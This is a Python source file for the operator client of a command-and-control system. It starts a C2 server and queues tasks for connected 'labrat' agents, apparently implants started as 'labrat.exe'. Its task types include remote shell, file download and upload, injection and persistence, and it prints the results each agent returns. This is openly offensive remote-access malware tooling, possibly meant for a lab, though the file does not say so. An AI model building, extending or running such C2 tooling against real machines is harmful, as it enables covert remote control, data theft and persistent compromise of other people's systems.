#!/usr/bin/env python3
"""Operator CLI — queue tasks for connected labrat agents."""

from __future__ import annotations

import argparse
import sys

from c2_server import get_result, list_agents, queue_task, run_server


def main() -> None:
    parser = argparse.ArgumentParser(description="labrat operator client")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--agent", help="agent id (default: first seen)")
    parser.add_argument("cmd", nargs="?", help="shell|download|upload|inject|persist|agents")
    parser.add_argument("arg", nargs="?", default="", help="command argument")
    args = parser.parse_args()

    run_server(args.host, args.port)

    if not args.cmd:
        parser.print_help()
        return

    if args.cmd == "agents":
        import time
        time.sleep(0.2)
        agents = list_agents()
        for a in agents:
            print(a)
        if not agents:
            print("(no agents yet)")
        return

    agent = args.agent
    if not agent:
        import time
        for _ in range(50):
            agents = list_agents()
            if agents:
                agent = agents[0]
                break
            time.sleep(0.1)
        if not agent:
            print("No agent connected — start labrat.exe first")
            sys.exit(1)

    if args.cmd == "upload" and "|" not in args.arg:
        print("upload requires path|base64")
        sys.exit(1)

    task_id = queue_task(agent, args.cmd, args.arg)
    print(f"queued {args.cmd} task_id={task_id} agent={agent}")
    result = get_result(task_id, timeout=60.0)
    if not result:
        print("timeout waiting for result")
        sys.exit(1)
    print(f"rc={result.get('rc')}")
    out = result.get("stdout", "")
    if out:
        print(out)
    err = result.get("stderr", "")
    if err:
        print(f"stderr: {err}")


if __name__ == "__main__":
    main()
